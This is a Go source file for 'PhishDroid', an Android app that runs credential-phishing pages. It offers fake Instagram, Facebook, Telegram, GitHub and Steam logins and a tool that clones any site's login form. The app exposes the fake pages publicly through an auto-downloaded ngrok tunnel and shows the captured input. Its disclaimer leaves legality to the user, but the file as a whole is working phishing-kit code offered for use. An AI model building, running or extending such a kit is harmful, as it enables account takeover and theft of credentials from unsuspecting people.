package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/raifpy/Go/errHandler"

	"fyne.io/fyne/layout"

	"fyne.io/fyne/canvas"

	"fyne.io/fyne"
	"fyne.io/fyne/app"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/theme"
	"fyne.io/fyne/widget"
)

var cizgi = widget.NewToolbarSeparator().ToolbarObject()
var space = widget.NewLabel("")

const version = 0.1

func islem(win fyne.Window, uyg fyne.App, typePhis string) {
	var fonksiyon func(fyne.Window, *widget.TextGrid, *string)
	switch typePhis {
	case "InstagramTelif":
		fonksiyon = serveInstagramTelif
	case "InstagramLogin":
		fonksiyon = serveInstagramLogin
	case "GithubLogin":
		fonksiyon = serveGithubLogin
	case "SteamLogin":
		fonksiyon = serveSteamLogin
	case "MyTelegramLogin":
		fonksiyon = serveMyTelegramLogin
	case "FacebookLogin":
		fonksiyon = serveFacebookLogin
	default:
		dialog.ShowError(fmt.Errorf("Dev Error !\nUnDefinied PhishType"), win)
		return
	}
	//fmt.Println("Merhaba Dünya")
	text := widget.NewTextGridFromString("url waiting...")
	//textGrid := widget.NewTextGrid()
	//textGrid := widget.NewLabelWithStyle("", fyne.TextAlignLeading, fyne.TextStyle{Bold: false, Italic: true, true})
	textGrid := widget.NewTextGrid()
	//textGrid.SetStyle(1, 1, nil)
	/*copyButton := widget.NewButtonWithIcon(" Copy", theme.ContentCopyIcon(), func() {
		//win.Clipboard().SetContent(text.Text())
		uyg.SendNotification(fyne.NewNotification("PhishDroid", text.Text()))
	})*/
	//textGroup := widget.NewScrollContainer(textGrid)

	group := widget.NewGroupWithScroller("PhishDroid", text, cizgi, textGrid)

	win.SetContent(group)

	go func() {
		if !checkNgrok() {
			text.SetText("ngrok not found!")
			return
		}
		//ngrokCmd, err := runNgrok("8080")
		_, err := runNgrok("8089")
		if err != nil {
			dialog.ShowError(err, win)
		}
		var textStream string
		go fonksiyon(win, textGrid, &textStream)
		ngrokurl, err := getNgrokLinkStable()
		if err != nil {
			dialog.ShowError(err, win)
			return
		}
		text.SetText(ngrokurl)

		urlNgrok, err := url.Parse(ngrokurl)
		if err != nil {
			dialog.ShowError(err, win)
		}
		uyg.OpenURL(urlNgrok)

	}()
	runtime.GC()

}

func main() {
	defer func() {
		rec := recover()
		if rec != nil {
			log.Println(rec)
			os.Exit(1)
		}
	}()

	runtime.LockOSThread()
	os.Chdir("/data/data/org.codeksiyon.phishdroid")

	uyg := app.New()
	notiApp = uyg
	uyg.Settings().SetTheme(theme.DarkTheme())
	//kanal := make(chan bool)

	win := uyg.NewWindow("PhishDroid Beta")

	defer func() {
		rec := recover()
		if rec != nil {
			dialog.ShowError(fmt.Errorf(rec.(string)), win)
			os.Exit(1)
		}
	}()

	win.SetIcon(iconsource)

	icon := canvas.NewImageFromResource(resourceFesPng)
	icon.FillMode = canvas.ImageFillOriginal

	phishdroidText := widget.NewLabelWithStyle("PhishDroid  B E T A", fyne.TextAlignCenter, fyne.TextStyle{true, false, false})
	codeksyinText := widget.NewLabelWithStyle("©Codeksiyon All Rights Reserved", fyne.TextAlignCenter, fyne.TextStyle{false, true, true})
	infinity := widget.NewProgressBarInfinite()
	infinity.Start()

	versionText := "\nVersion " + fmt.Sprint(version) + "\nArch " + runtime.GOARCH
	versionLabel := widget.NewLabelWithStyle(versionText, fyne.TextAlignCenter, fyne.TextStyle{false, true, true})

	vbox := widget.NewVBox(icon, phishdroidText, space, cizgi, versionLabel, space, cizgi, space, codeksyinText, space, infinity)

	win.SetContent(vbox)
	go func() {
		if _, err := os.Stat("./ok"); os.IsNotExist(err) {

			dialog.ShowConfirm("DISCLAIMER", "The use of the PhishDroid & its phishing-pages\nis COMPLETE RESPONSIBILITY of the END-USER.\nDevelopers assume NO liability and\nNOT responsiblefor any misuse or damage\ncaused by this program. Also we inform\nyou that some of your your actions\nmay be ILLEGAL and you CAN NOT\nuse this software to test person\nor company without\nWRITTEN PERMISSION from them.", func(tim bool) {
				if !tim {
					log.Println("Oh No :D")
					uyg.Quit()
					os.Exit(1)
				} else {
					if f, err := os.Create("./ok"); err == nil {
						f.Close()
					} else {
						dialog.ShowError(err, win)
					}

				}
			}, win)
		}
		time.Sleep(time.Second * 7)
		gui(uyg, win)
		runtime.GC()
	}()
	runtime.GC()
	win.ShowAndRun()

}

func gui(uyg fyne.App, win fyne.Window) {
	go func() {

		if checkNgrok() {
			return
		}
		time.Sleep(time.Second * 3)
		infi := dialog.NewProgressInfinite("ngrok downloading", "Ngrok downloading for your arch ("+runtime.GOARCH+")", win)
		go func() {
			err := getNgrok()
			if err != nil {
				dialog.NewError(err, win)
			}
			infi.Hide()
		}()
		infi.Show()
		runtime.GC()
	}()

	//customngroklink := widget.NewTextGridFromString("ngrok url waiting")
	customLabel := widget.NewLabel("You can use every site's template")
	customText := widget.NewTextGridFromString("How To\n\nType your site and presss go!")
	customEntry := widget.NewEntry()
	customEntry.SetPlaceHolder("https://cartcurtweb.com/login")

	customButon := widget.NewButtonWithIcon("Go", theme.ConfirmIcon(), func() {
		if strings.Trim(customEntry.Text, " ") == "" {
			dialog.ShowInformation("Empty Url", "Fill entry :9", win)
			return
		}
		infi := dialog.NewProgressInfinite("Waiting Ngrok", "Just a second...", win)
		infi.Show()
		runNgrok("8089")
		serverLink, err := getNgrokLinkStable()
		infi.Hide()
		if err != nil {
			dialog.ShowError(err, win)
			serverLink = "http://127.0.0.1:8089"
		}

		//customngroklink.SetText(serverLink)
		fmt.Println(serverLink)

		infi = dialog.NewProgressInfinite("Waiting Request", "Just a second...", win)
		infi.Show()
		oye := customHTMLwithHTTP(customEntry.Text, serverLink)
		infi.Hide()
		if err, ok := oye["error"]; ok {
			dialog.ShowError(err.(error), win)
			return
		}
		//scripts := oye["scripts"].(int)
		values := oye["values"].([]string)
		html := oye["html"].(string)

		//dialog.ShowInformation("Custom Values", fmt.Sprintf("Detected %d script tags.\nform values;\n%s", scripts, strings.Join(values, "\n")), win)
		if len(values) == 0 {

			dialog.ShowInformation("form-input", "Maybe this page\n("+customEntry.Text+")\n isn't login page...", win)
			return
		}
		go func() {
			makeCustomWindow(win, html, serverLink, customEntry.Text)
		}()
		openurl, _ := url.Parse(serverLink)
		uyg.OpenURL(openurl)
	})

	customgroup := widget.NewGroup("Custom Template", customLabel, customText, customEntry, customButon, space, cizgi)
	//custom := widget.NewAccordionItem("Custom >-", customgroup)
	custom := widget.NewButton(">- Custom", func() {
		win.SetContent(customgroup)
	})

	instagratelifmbuton := widget.NewButton("Copyright Form", func() {
		islem(win, uyg, "InstagramTelif")
	})

	instagramloginbuton := widget.NewButton("Login Page", func() {
		islem(win, uyg, "InstagramLogin")
	})
	instagramGroup := widget.NewGroup("Instagram", instagramloginbuton, instagratelifmbuton, space, cizgi)
	instagram := widget.NewAccordionItem("Instagram", instagramGroup)

	githubLoginButon := widget.NewButton("Login Page", func() {
		islem(win, uyg, "GithubLogin")
	})

	githubGroup := widget.NewGroup("Github", githubLoginButon, space, cizgi)
	github := widget.NewAccordionItem("Github", githubGroup)

	steamLoginButon := widget.NewButton("Login Page", func() {
		islem(win, uyg, "SteamLogin")
	})

	steamGroup := widget.NewGroup("Steam", steamLoginButon, space, cizgi)
	steam := widget.NewAccordionItem("Steam", steamGroup)

	myTelegramButon := widget.NewButton("MyTelegram Login", func() {
		islem(win, uyg, "MyTelegramLogin")
	})
	telegramGroup := widget.NewGroup("Telegram", myTelegramButon, space, cizgi)
	telegram := widget.NewAccordionItem("Telegram", telegramGroup)

	facebookLoginButon := widget.NewButton("Login Page", func() {
		islem(win, uyg, "FacebookLogin")
	})
	facebookGroup := widget.NewGroup("Facebook", facebookLoginButon, space, cizgi)
	facebook := widget.NewAccordionItem("Facebook", facebookGroup)
	accortdion := widget.NewAccordionContainer(instagram, facebook, telegram, github, steam)
	aboutTitle := widget.NewLabel("PhishDroid OpenSource GoLang Application")
	versionArch := widget.NewTextGridFromString(fmt.Sprintf("\nVersion %s\nArch    %s\nGoVers  %s", fmt.Sprint(version), runtime.GOARCH, runtime.Version()))
	codeksiyonURL, _ := url.Parse("https://t.me/codeksiyon")
	githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid")
	raifpyURL, _ := url.Parse("https://t.me/raifpy")
	grid := fyne.NewContainerWithLayout(layout.NewGridLayoutWithColumns(3), widget.NewHyperlink("@codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL), widget.NewHyperlink("@raifpy", raifpyURL))
	aboutGroup := widget.NewVBox(aboutTitle, versionArch, grid)
	about := widget.NewButtonWithIcon("About", theme.InfoIcon(), func() {
		dialog.ShowCustom("About", "Back", aboutGroup, win)
	})
	cisim := canvas.NewImageFromResource(resourceTakPng)
	cisim.FillMode = canvas.ImageFillOriginal
	group := widget.NewGroupWithScroller("PhishDroid  B E T A", accortdion, custom, about, cisim, cizgi, widget.NewLabelWithStyle("@codeksiyon GPL3+", fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false}))
	go func() { // Check is avaible new version
		verReq, err := http.Get("https://raw.githubusercontent.com/codeksiyon/PhishDroid/master/version")
		if errHandler.HandlerBool(err) {
			//group.Append(widget.NewTextGridFromString(err.Error()))
			return
		}
		ham, _ := ioutil.ReadAll(verReq.Body)
		hamStr := strings.Trim(string(ham), "\n")
		reqVer, err := strconv.ParseFloat(hamStr, 32)
		if errHandler.HandlerBool(err) {
			return
		}
		if reqVer > version {
			log.Println("Detected new version!")
			newverslabel := widget.NewLabelWithStyle("New PhishDroid Version Avaible ! -> "+hamStr, fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false})
			newversbuton := widget.NewButton("Download", func() {
				githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid/releases")
				uyg.OpenURL(githubURL)

			})
			laylay := fyne.NewContainerWithLayout(layout.NewGridLayoutWithRows(2), newverslabel, newversbuton)

			group.Append(laylay)
		}
		runtime.GC()

	}()

	win.SetContent(group)
}
